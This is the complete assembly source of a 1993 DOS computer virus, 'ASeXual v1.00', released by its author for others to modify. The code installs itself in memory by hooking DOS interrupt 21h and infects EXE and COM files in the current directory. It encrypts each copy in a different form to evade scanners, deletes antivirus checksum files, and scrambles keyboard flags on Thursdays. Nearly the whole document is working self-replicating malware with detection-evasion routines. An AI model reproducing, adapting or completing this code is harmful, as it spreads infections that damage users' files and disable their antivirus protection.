;����������������������������������������������������������������������������
; ************************************************
;     ASeXuAl v1.00 - BY VIROGEN - 10-29-93
; ************************************************
;  - Compatible with : TASM /m
;
;        ASeXual v1.00
;     ����������������������
;
;  TYPE : Parastic & Spawning Resident Encrypting (PSRhA)
;
;    Because of my ignorance I released the last version of ASeXual with
;  a MAJOR bug.. you would expierence very frequent system lockups not
;  to mention that infections of files in the root directory screwed them
;  all future generations.
;
;   new in this version:
;     - Lockup bugs fixed!
;     - root directory infections fixed!  (no longer infects spawning in root)
;     - spawning infections now return the correct return code from the EXE
;     - cosmetic changes
;     - no more error handler
;
;  characteristics:
;    This virus is a memory resident parastic COM infector and spawning
;   EXE infector. It is mutative.. with only 2 bytes remain constant
;   in replicated copies, but none in constant relative locations to the start
;   of viral code or to each other. It infects up to 5 files in the
;   current directory which a program is executed or a new drive is selected.
;   It first searches out EXE hosts, and if there are none to be infected,
;   it then proceeds to COM infections. All ANTI-VIR.* and CHKLST.* files
;   in the current directory are killed before any file is infected.   This
;   virus is also kept encrypted in memory to prevent easy detection of it
;   there too.     It's code is stored just below the 640k boundary.  There
;   will be a decrease of about 5k of total system memory when this virus is
;   resident.
;
;  activation:
;   This is a non-malicious virus and it's activation is simple.. On any
;   thursday it changes the keyboard flags (CTRL,ALT,L&RSHIFT,NUM LOCK,CAPS,
;   and SCROLL LOCK) constantly while it is memory resident. It does not
;   infect files on thursdays.
;
;
;  As always I'm releasing the full source code to this virus.. which means
;  you are free to make modifications to it. Just give credit where credit
;  is due and have phun..
;

segment	    cseg
	    assume  cs: cseg, ds: cseg,es: cseg

signal	    equ	    6bh			    ; Installation check
reply	    equ	    0fah		    ; reply to check

max_inf	    equ	    05			    ; Maximum files to infect per run
max_rotation equ    9			    ; number of bytes in switch byte table
parastic    equ	    01			    ; Parastic infection
spawn	    equ	    00			    ; Spawning infection
heap_size   equ	    50h			    ; max heap size
	    org	    100h		    ; Leave room for PSP

start:
;�����������������������������������������������������������������������
; Encryption/Decryption routine location
;����������������������������������������������������������������������
fill_space  :
shit_space  db	    6 dup(0)		    ; help to keep TBAV warnings down
address_fill: jmp   non_res		    ; only in original compilation
	    db	    17 dup(0)		    ; MOV DI|SI placed here
encrypt:    	    			    ; For call from memory
cx_fill	    db	    20 dup(0)		    ; MOV CX,XXXX placed here
xor_inc_space db    100 dup(0)		    ; XOR and INC DI|SI(2) placed here
loop_fill   db	    10 dup(0)		    ; LOOP Placed Here
enc_data:
ret_byte    dw	    9090h		    ; Changes to RET (0C3h) - then back to NOP

jmp	    non_res 			    ; jump to nonresident code

;�����������������������������������������������������������������������
; INT 21h - DOS function calls
;�����������������������������������������������������������������������

new21	    proc    			    ; New INT 21H handler

	    cmp	    ah, signal		    ; signaling us?
	    jne	    no			    ; nope..
	    mov	    ah,reply		    ; yep, give our offspring what he wants
	    iret
	    no:
	    pushf   			    ; Push flags
	    push    ax			    ; Push regs
	    push    bx
	    push    cx
	    push    dx
	    push    di
	    push    si
	    push    bp
	    push    ds
	    push    es
	    push    sp
	    push    ss

	    cmp	    ah,0eh		    ; select disk?
	    je	    infect_call		    ; yes.. let's infect
	    cmp	    ax,4b00h		    ; exec?
	    jne	    exit_21		    ; nope.. don't infect shit
	    cmp	    ch,0fbh		    ; Is our virus executing this prog?
	    jne	    infect_call		    ; yes, return to orginal INT 21h

	    exit_21:
	    pop	    ss			    ; Pop regs
	    pop	    sp
	    pop	    es
	    pop	    ds
	    pop	    bp
	    pop	    si
	    pop	    di
	    pop	    dx
	    pop	    cx
	    pop	    bx
	    pop	    ax
	    popf    			    ; Pop flags
	    end_21  :
	    db	    0eah		    ; jump to original int 21h
old21_ofs   dw	    0			    ; Offset of old INT 21H
old21_seg   dw	    0			    ; Seg of old INT 21h
infect_call:
	    mov	    ah,2ah		    ; get date
	    int	    21h
	    cmp	    al,4		    ; thursday?
	    je	    chg_keyb
	    mov	    ah,2fh		    ; Get DTA Address
	    int	    21h			    ;
	    push    cs
	    pop	    ds
	    push    cs
	    pop	    es
	    mov	    word ptr old_dta,bx	    ; Save old dta offset
	    mov	    word ptr old_dta+2,es   ; /segment

	    call    encrypt_mem		    ; decrypt virus in memory
	    call    resident		    ; Call infection kernal
	    call    encrypt_mem		    ; encrypt virus in memory

	    lds	    dx,dword ptr old_dta    ; restore DTA segment/offset
	    mov	    ah,1ah		    ;
	    int	    21h			    ;
	    jmp	    exit_21

chg_keyb:
	    xor	    ax,ax
	    mov	    es,ax
	    mov	    dx,es: [416h]	    ; 0040:0016h - keyboard flags
	    ror	    dx,1		    ; rotate bits
	    mov	    es: [416h],dx	    ; store new flags
	    jmp	    exit_21

new21	    endp    			    ; End of handler
;�����������������������������������������������������������������������
; Encrypt/Decrypt - For memory encryption
;�����������������������������������������������������������������������
encrypt_mem proc
	    lea	    di,memory_encrypted
	    mov	    cx,(offset vend-offset memory_encrypted)/2
	    mem_xor_loop:
	    db	    81h,35h		    ; XOR word ptr [DI],
	    xor_mem dw 0		    ; XXXX : 0-5999
	    inc	    di			    ; increment pointer
	    inc	    di			    ; increment pointer
	    loop    mem_xor_loop	    ; loop..
	    ret	    			    ; return
encrypt_mem endp
memory_encrypted:   			    ; start encryption in memory here..

;����������������������������������������������������������������������
; file pointer set
;���������������������������������������������������������������������-
	    offset_zero:
	    xor	    al,al
	    jmp	    set_fp
	    offset_end:
	    mov	    al,02h
	    set_fp:
	    mov	    ah,42h
	    xor	    cx,cx
	    xor	    dx,dx
	    int	    21h
	    ret
;�����������������������������������������������������������������������
; Clear ff/fn buf
;�����������������������������������������������������������������������
clear_buf:
	    mov	    word ptr fcb,0	    ; Clear ff/fn buffer
	    lea	    si, fcb
	    lea	    di, fcb+2
	    mov	    cx, 22
	    rep	    movsw
	    ret
;�����������������������������������������������������������������������
; Findfirst
;�����������������������������������������������������������������������
ff_func:

	    call    clear_buf		    ; Clear FCB

	    mov	    ah, 4eh		    ; Findfirst
	    xor	    cx, cx		    ; Set normal file attribute search
	    mov	    dx, fname_off
	    int	    21h

	    ret
;�����������������������������������������������������������������������
; Findnext
;�����������������������������������������������������������������������
fn_func:

	    mov	    ah,4fh		    ; find next file
	    int	    21h			    ;

	    ret

;�����������������������������������������������������������������������
; Fills encryption/decryption routine
;
; call with AX=word to fill with
;�����������������������������������������������������������������������
clear_encryptor:
	    mov	    cx,78		    ; 156 bytes
	    lea	    di,fill_space	    ; beginning of null space
	    fill_loop:
	    stosw
	    loop    fill_loop		    ;

	    ret
;�����������������������������������������������������������������������
; Resident - Main infection kernal
;�����������������������������������������������������������������������
resident    proc

	    	    			    ; Set DTA address - This is for the
	    mov	    ah, 1ah		    ; findfirst/findnext functions
	    lea	    dx, fcb
	    int	    21h

	    mov	    byte ptr vtype,spawn    ; infection type = spawning
	    mov	    word ptr set_bp,0000    ; BP=0000 on load
	    mov	    byte ptr inf_count,0    ; null infection count
	    mov	    fname_off, offset spec  ; Set search for CHKLIST.*
	    mov	    word ptr mov_di,offset enc_data ; offset past encrypt.

	    cont_res:
;�����������������������������������������������������������������������
; KIll chklist.* (MSAV,CPAV) and anti-vir.* (TBAV) files
;�����������������������������������������������������������������������
	    mov	    cx,2		    ; keep track of which we've killed
	    kill_another_spec:
	    push    cx

	    call    ff_func		    ; find first

	    jc	    done_kill		    ; none found.. done
	    kill_loop:
	    mov	    ax,4301h		    ; Set file attributes to null
	    xor	    cx,cx		    ;
	    lea	    dx,f_name		    ;
	    int	    21h			    ;

	    mov	    ah,3ch		    ; create file = nullify size
	    xor	    cx,cx		    ;
	    lea	    dx,f_name		    ;
	    int	    21h			    ;
	    push    ax			    ; get handle
	    pop	    bx			    ;

	    mov	    ah,3eh		    ; close file
	    int	    21h			    ;

	    mov	    ah,41h		    ; delete the file to finish 'er off
	    lea	    dx,f_name		    ;
	    int	    21h			    ;
	    call    fn_func
	    jnc	    kill_loop		    ; if more then kill 'em

	    done_kill:
	    pop	    cx			    ; restore spec counter
	    mov	    fname_off,offset spec2  ; new file spec to kill
	    dec	    cx
	    jz	    kill_another_spec	    ; have we already killed both?

;������������������������������������������������������������������������
; start finding files to infect
;�������������������������������������������������������������������������


	    mov	    fname_off,offset fname1
	    find_first:
	    call    ff_func		    ; findfirst

	    jnc	    next_loop		    ; if still finding files then loop
	    jmp	    exit		    ; if not.. then end this infection
	    next_loop :
	    cmp	    byte ptr vtype, parastic ; parastic infection?
	    je	    start_inf		    ; yes, skip all this
	    cmp	    word ptr f_sizel,0	    ; Make sure file isn't 64k+
	    je	    ok_find		    ; for spawning infections
	    jmp	    no_infect

	    ok_find:

	    mov	    ah,47h		    ; get directory for
	    xor	    dl,dl		    ; ..spawning infections
	    lea	    si,file_dir		    ;
	    int	    21h			    ;

	    cmp	    byte ptr file_dir,0
	    jne	    not_root
	    jmp	    no_infect
	    not_root:
	    xor	    bx,bx		    ;
	    lm3	    :			    ; find end of directory name
	    inc	    bx			    ;
	    cmp	    file_dir[bx],0
	    jne	    lm3

	    mov	    file_dir[bx],'\'	    ; append backslash to path
	    inc	    bx

	    mov	    cx,13		    ; append filename to path
	    lea	    si,f_name
	    lea	    di,file_dir[bx]
	    rep	    movsb

	    xor	    bx,bx
	    loop_me: 			    ; search for filename ext.
	    inc	    bx
	    cmp	    byte ptr fcb+1eh [bx], '.'
	    jne	    loop_me

	    inc	    bx			    ; change it to COM
	    mov	    word ptr fcb+1eh [bx],'OC'
	    mov	    byte ptr fcb+1eh [bx+2],'M'
	    start_inf:
;�����������������������������������������������������������������������
; Change jump & fill space register
;�����������������������������������������������������������������������

	    cmp	    byte ptr new_code, 0bfh
	    jne	    inc_both
	    mov	    nop_sub, 3fh
	    mov	    byte ptr new_code, 0b7h
	    mov	    byte ptr push_reg, 4fh
inc_both:
	    inc	    nop_sub		    ; increment register
	    inc	    byte ptr new_code	    ; increment register
	    inc	    byte ptr push_reg	    ; increment register

	    cmp	    nop_sub, 044h	    ; don't use SP
	    je	    inc_both
done_change_jmp:

	    cmp	    byte ptr vtype, spawn   ; spawning infection?
	    jne	    parastic_inf

;�����������������������������������������������������������������������
; Spawning infection
;�����������������������������������������������������������������������
	    spawning:
	    mov	    word ptr new_code+1,offset fill_space

	    lea	    dx,f_name
	    mov	    cx, 00000011b	    ; read-only & hidden
	    mov	    ah, 3ch		    ; Create file
	    int	    21h			    ; Call INT 21H
	    jc	    p_no_infect		    ; If Error-probably already infected
	    inc	    inf_count
	    mov	    bx,ax

	    jmp	    encrypt_ops
;�����������������������������������������������������������������������
; Parastic infection
;�����������������������������������������������������������������������
            p_no_infect : jmp no_infect
	    p_close : jmp close
	    parastic_inf :

	    lea	    si,f_name		    ; Is Command.COM?
	    lea	    di,com_name
	    mov	    cx,11
	    repe    cmpsb

	    je	    p_no_infect		    ; Yes, don't infect

	    mov	    ax,3d02h		    ; Open file for reading & writing
	    lea	    dx,f_name		    ; Filename in FF/FN buffer
	    int	    21h

	    jc	    p_no_infect		    ; error, skip infection

	    mov	    bx,ax		    ; get handle

	    mov	    ah,3fh		    ; Read first bytes of file
	    mov	    cx,07
	    lea	    dx,org_bytes
	    int	    21h

	    cmp	    byte ptr org_bytes+4,0c3h ; already infected?
	    je	    p_close		    ; yep..don't infect it

	    cont_inf:
	    inc	    inf_count
	    call    offset_end

	    mov	    word ptr set_bp,ax	    ; Change the MOV BP inst.
	    add	    ax, offset enc_data
	    mov	    word ptr mov_di,ax	    ; chg mov di,xxxx

	    call    offset_zero
	    mov	    ax,word ptr f_sizeh	    ; save new address for parastic
	    add	    ax,offset fill_space    ;
	    mov	    word ptr new_code+1,ax  ;

	    mov	    ah,40h		    ; write new first 7 bytes
	    mov	    cx,7		    ; .. jumps to virus code
	    lea	    dx,new_code		    ;
	    int	    21h			    ;

	    call    offset_end

;�����������������������������������������������������������������������
; Change encryptions ops
;�����������������������������������������������������������������������
encrypt_ops:
	    push    bx			    ; save file handle

	    cmp	    pad_bytes,100h	    ; no more increase in file size?
	    je	    reset_pad		    ; if yes, reset
	    inc	    word ptr pad_bytes	    ; Increase file size
	    inc	    word ptr b_wr	    ; make note of the increase
	    jmp	    pad_ok		    ; don't reset pad
	    reset_pad:
	    mov	    word ptr pad_bytes,0    ; reset pad size
	    sub	    word ptr b_wr,100h	    ; make note of decrease

	    pad_ok:

	    cmp	    inc_op,47h		    ; change ops from DI to SI
	    jne	    set2		    ; jmp-change ops to SI
	    dec	    inc_op		    ; .. change code to use DI
	    dec	    byte ptr xor_op+1	    ;
	    dec	    di_op		    ;
	    dec	    byte ptr enc_addr	    ;
	    dec	    byte ptr enc_add+1	    ;
	    jmp	    chg_three		    ;
	    set2:
	    inc	    inc_op		    ; increment code to use SI
	    inc	    byte ptr xor_op+1	    ;
	    inc	    di_op		    ;
	    inc	    byte ptr enc_addr	    ;
	    inc	    byte ptr enc_add+1	    ;

	    chg_three:
	    mov	    dh,byte ptr nop_sub	    ; which byte did we use to fill space?
	    cmp	    dh,48h		    ; if INC AX then we need to reset it
	    jne	    _change		    ; else decrement it
	    mov	    dh,40h		    ; reset to DEC AX
	    _change:
	    cmp	    dh,41h		    ; Don't use INC CX..
	    jne	    no_conflict		    ;
	    mov	    dh,48h		    ; Change it to DEC AX instead
	    no_conflict:
	    cmp	    dh,47h		    ; Don't use INC DI
	    jne	    no_conflict2	    ;
	    mov	    dh,4bh		    ; Use DEC BX Instead
	    no_conflict2:
	    cmp	    dh,46h		    ; Don't use INC SI
	    jne	    no_conflict3
	    mov	    dh,0fbh		    ; Use STI instead
	    no_conflict3:
	    mov	    dl,dh		    ; mov into word reg dx
	    push    dx
	    pop	    ax
	    call    clear_encryptor	    ; fill encryption routine with op

	    mov	    ah,inc_op		    ; get register to increment
	    mov	    bx,change_num	    ; get current rotate count
	    cmp	    bh,0		    ; are we at the end of the INCs?
	    jne	    no_reset_change	    ; nope.. continue
	    mov	    bh,99		    ; reset INC #1 position
	    xor	    bl,bl		    ; reset INC #2 position
	    no_reset_change:
	    inc	    bl			    ; Increment INC #2 position
	    dec	    bh			    ; Decrement INC #1 position
	    mov	    cl,bl		    ; store position in CL to add
	    xor	    ch,ch		    ; high byte = 0
	    lea	    si,xor_inc_space	    ;
	    push    si			    ; save address
	    push    si			    ; save it twice
	    add	    si,cx		    ; add INC #2 position to SI
	    mov	    byte ptr [si],ah	    ; move INC #2 into address
	    pop	    si			    ; restore address of fill_space
	    mov	    cl,bh		    ; store position in CL to add
	    xor	    ch,ch		    ; high byte = 0
	    add	    si,cx		    ; add INC #1 position to SI
	    mov	    byte ptr [si],ah	    ; move INC #1 into address
	    mov	    change_num,bx	    ; store updated rotation number

	    pop	    si			    ; get xor_inc_space address
	    mov	    ax,xor_pos		    ; get old position of XOR
	    cmp	    ax,95		    ; is it at the end of the buffer?
	    jne	    xor_ok		    ; nope.. increment its position
	    mov	    ax,10		    ; reset position to buffer+10
	    xor_ok:
	    inc	    ax			    ; increment position pointer
	    add	    si,ax		    ; build pointer
	    mov	    dx,word ptr xor_op	    ; get XOR op
	    mov	    byte ptr [si],02eh
	    mov	    [si+1],dx		    ; place it into position
	    mov	    xor_pos,ax		    ; save new XOR location

	    mov	    ax,addr_pos		    ; get old position of MOV DI|SI
	    cmp	    ax,17		    ; at end of buffer?
	    jne	    addr_inc		    ; nope.. go increment
	    xor	    ax,ax		    ; yes.. reset to null
	    addr_inc:
	    inc	    ax			    ; increment pointer
	    lea	    di,address_fill	    ; get buffer address
	    add	    di,ax		    ; build pointer
	    lea	    si,di_op		    ; get address of op
	    mov	    cx,3		    ; 3 bytes
	    rep	    movsb		    ; copy op to location in buffer
	    mov	    addr_pos,ax		    ; save new MOV DI|SI position

	    mov	    ax,cx_pos		    ; get old position of MOV CX
	    cmp	    ax,0		    ; back to beginning of buffer?
	    jne	    cx_dec		    ; nope.. decrement location
	    mov	    ax,17		    ; reset to last position in buffer
	    cx_dec:
	    dec	    ax			    ; decrement pointer
	    lea	    di,cx_fill		    ; get address of buffer
	    add	    di,ax		    ; build pointer to new location
	    lea	    si,cx_op		    ; get address of MOV CX op
	    mov	    cx,3		    ; 3 bytes length
	    rep	    movsb		    ; copy to new location
	    mov	    cx_pos,ax		    ; save new position of MOV CX

	    mov	    ax,loop_pos		    ; get old position of LOOP
	    cmp	    ax,0		    ; at beginning of buffer?
	    jne	    loop_inc		    ; nope decrement
	    mov	    ax,8		    ; reset to end of buffer
	    loop_inc:
	    dec	    ax			    ; decrement pointer
	    lea	    di,loop_fill	    ; get address of buffer
	    add	    di,ax		    ; build pointer
	    mov	    dl,0e2h		    ; 0E2XX=LOOP XXXX
	    xor	    ch,ch		    ; high byte=null
	    mov	    cl,9ah		    ; calculate LOOP offset
	    sub	    cx,ax		    ;
	    mov	    dh,cl		    ; save new offset
	    mov	    [di],dx		    ; write LOOP op
	    mov	    loop_pos,ax		    ; save new position of LOOP

;�����������������������������������������������������������������������
; Get random XOR number, save it, copy virus, encrypt code
;�����������������������������������������������������������������������
	    d2:
	    mov	    ah,2ch		    ;
	    int	    21h			    ; Get random number from clock - sec/ms
	    lea	    si,xor_inc_space+3	    ; build pointer to XOR location+2
	    add	    si,xor_pos		    ;
	    mov	    word ptr [si],dx	    ; save encryption #
	    push    dx
	    mov	    word ptr xor_mem,0000

	    mov	    si,0100h		    ; 100h=start of virus in memory
	    lea	    di,vend+heap_size	    ; destination
	    mov	    cx,offset vend-100h	    ; bytes to move
	    rep	    movsb		    ; copy virus outside of code

	    pop	    dx
	    mov	    word ptr xor_mem,dx
	    enc_addr:
	    mov	    di,offset vend
	    enc_add:
	    add	    di,offset enc_data-100h+heap_size ; offset of new copy of virus
	    mov	    byte ptr ret_byte,0c3h  ; make encryption routine RET
	    call    encrypt		    ; encrypt new copy of virus
	    mov	    byte ptr ret_byte,90h   ; Reset it to no RETurn
;�����������������������������������������������������������������������
; Write and close new infected file
;�����������������������������������������������������������������������
	    pop	    bx
	    mov	    cx, offset vend-100h    ; # of bytes to write
	    add	    cx, pad_bytes
	    lea	    dx, vend+heap_size	    ; Offset of buffer
	    mov	    ah, 40h		    ; -- our program in memory
	    int	    21h			    ; Call INT 21H function 40h

	    mov	    ax,5701h		    ; Restore data/time
	    mov	    cx,word ptr f_time	    ; time from FCB
	    mov	    dx,word ptr f_date	    ; date from FCB
	    int	    21h

	    close:
	    mov	    ah, 3eh		    ; close file
	    int	    21h

	    no_infect:
	    find_file:

	    cmp	    inf_count, max_inf	    ; Max files found?
	    je	    exit		    ; yes, end infection
	    call    fn_func
	    jc	    exit		    ; if no files found.. quit
	    jmp	    next_loop		    ; infect the next file

	    exit    :
	    cmp	    inf_count,0		    ; Start parastic infection on next run
	    jne	    find_done		    ; nope.. we're done
	    cmp	    byte ptr vtype, parastic ; Parastic infection done?
	    je	    find_done		    ; yep, exit already
	    mov	    fname_off, offset fname2 ; Point to new filespec
	    mov	    byte ptr vtype, parastic ; virus type = parastic
	    jmp	    find_first		    ; do it again for parastic

	    find_done:

	    xor	    ax,ax		    ; fill encryption routine with 0
	    call    clear_encryptor	    ; .. maybe help lessen IDed in memory?

	    ret	    			    ; return

resident    endp

;�����������������������������������������������������������������������
;  Non-resident active code
;�����������������������������������������������������������������������
non_res	    proc

	    db	    0bdh		    ; MOV BP,xxxx - Load delta offset
set_bp:	    dw	    0000

	    mov	    ax,ds: 002ch	    ; Get environment address
	    mov	    par_blk[bp],ax	    ; Save in parameter block for exec

	    mov	    par1[bp],cs		    ; Save segments for spawn
	    mov	    par2[bp],cs
	    mov	    par_seg[bp],cs

;�����������������������������������������������������������������������
; INSTALL - Install the virus in memory
;�����������������������������������������������������������������������
	    mov	    ah,signal		    ; is virus already in mem?
	    int	    21h
	    cmp	    ah,reply
	    je	    no_install		    ; yes.. don't install again
	    cont_i:

	    mov	    ax,cs		    ; PSP segment
	    dec	    ax			    ; mcb=psp-1
	    mov	    ds,ax		    ; DS=MCB
	    cmp	    byte ptr ds: [0],'Z'    ;Is this the last MCB in chain?
	    jne	    no_install

            sub     word ptr ds: [3],(((vend-start+1023+heap_size)*2)/1024)*64 ; shrink block
	    sub	    word ptr ds: [12h],(((vend-start+1023+heap_size)*2)/1024)*64
	    mov	    es,word ptr ds: [12h]   ; get high mem seg

	    mov	    si,bp
	    add	    si,0100h
	    mov	    cx,(offset vend - offset start)/2+1
	    push    cs
	    pop	    ds
	    mov	    di,100h		    ; New location in high memory
	    rep	    movsw		    ; Copy virus to high memory

	    xor	    ax,ax
	    mov	    ds,ax		    ; null es
	    push    ds
	    lds	    ax,ds: [21h*4]	    ; get old int 21h seg:off
	    mov	    es: old21_seg,ds	    ; save 'em
	    mov	    es: old21_ofs,ax
	    pop	    ds


	    mov	    ds: [21h*4+2],es	    ; new int 21h seg
	    mov	    ds: [21h*4],offset new21 ; new offset

            sub     byte ptr ds: [413h],((offset vend-offset start+1023+heap_size)*2)/1024

	    no_install:
	    push    cs			    ; Restore segment regs
	    pop	    ds
	    push    cs
	    pop	    es

	    cmp	    byte ptr vtype[bp],parastic ; parastic infection?
	    je	    com_return		    ; yes, return to start of COM

	    mov	    bx,(offset vend+100)    ; Calculate memory needed
	    mov	    cl,4		    ; divide by 16
	    shr	    bx,cl
	    inc	    bx
	    mov	    ah,4ah
	    int	    21h			    ; Release un-needed memory

	    lea	    dx,file_dir-1[bp]	    ; Execute the original EXE
	    lea	    bx,par_blk[bp]
	    mov	    ch,0fbh		    ; tell mem. resident virus
	    mov	    ax,4b00h		    ; that it's us.
	    int	    21h

	    mov	    ah,4dh		    ; get return code
	    int	    21h

	    mov	    ah,4ch		    ; Exit
	    int	    21h

	    com_return:

	    mov	    si,bp		    ;
	    mov	    cx,7		    ; Restore original first
	    add	    si,offset org_bytes	    ; seven bytes of COM file
	    mov	    di,0100h		    ;
	    rep	    movsb		    ;

	    mov	    ax,0100h		    ; Jump back to 100h - start of
	    push    ax			    ; original program
	    ret	    			    ;

non_res	    endp

vtype	    db	    spawn		    ; Infection type
com_name    db	    'COMMAND.COM'	    ; obvious
org_bytes   db	    7 dup(0)		    ; original first seven bytes of parastic inf.
pad_bytes   dw	    0			    ; Increase in virus size
inc_op	    db	    47h			    ; INC DI (47h) or INC SI (46h)
nop_sub	    db	    40h			    ; fill byte
copyr	    db	    ' (c)1993 - Virogen '   ; my name
v_id	    db	    ' ASeXual Virus V1.00 '
spec	    db	    'CHKLIST.*',0	    ; MS/CPAV Checksom kill
spec2	    db	    'ANTI-VIR.*',0	    ; TBAV Checksum kill
fname1	    db	    '*.EXE',0		    ; Filespec
fname2	    db	    '*.COM',0		    ; Filespec
change_num  dw	    1030		    ; keep track of position of INC DI|SI
addr_pos    dw	    0			    ; relative location of MOV DI|SI
cx_pos	    dw	    17			    ; relative location of MOV CX
xor_pos	    dw	    10			    ; relative location of XOR
loop_pos    dw	    0			    ; relative location of LOOP
xor_op	    db	    81h,35h		    ; XOR word ptr CS:[DI|SI],XXXX
di_op	    db	    0bfh		    ; MOV DI|SI,
mov_di	    dw	    0			    ;  XXXX
cx_op	    db	    0b9h		    ; MOV CX
b_wr	    dw	    (offset vend-offset enc_data)+2 ; don't divide this by two
new_code    db	    0b9h		    ; MOV NN,
	    dw	    0000		    ;  XXXX
push_reg    db	    51h			    ; PUSH NN
	    db	    0c3h		    ; RET - jump to NN
times_inc   db	    0			    ; # of times encryption call incremented
sl	    db	    '\'			    ; Backslash for directory name
file_dir    db	    64 dup(0)		    ; directory of file we infected
file_name   db	    13 dup(0)		    ; filename of file we infected
par_blk	    dw	    0			    ; command line count byte   -psp
par_cmd	    dw	    0080h		    ; Point to the command line -psp
par_seg	    dw	    0			    ; seg
	    dw	    05ch		    ; Use default FCB's in psp to save space
par1	    dw	    0			    ;        
	    dw	    06ch		    ; FCB #2
par2	    dw	    0			    ;

vend:	    	    			    ; End of virus

;�����������������������������
; heap - not written to disk
;�����������������������������
fname_off   dw	    fname1		    ; Offset of Filespec to use
old_dta     dd      0                       ; Old DTA Segment:Address
inf_count   db	    0			    ; How many files we have infected this run
fcb	    db	    21 dup(0)		    ; fcb
	    attrib  db 0		    ; file attribute
	    f_time  dw 0		    ; file time
	    f_date  dw 0		    ; file date
	    f_sizeh dw 0		    ; file size
	    f_sizel dw 0		    ;
	    f_name  db 13 dup(0)	    ; file name
heap_end:

cseg	    ends
	    end	    start
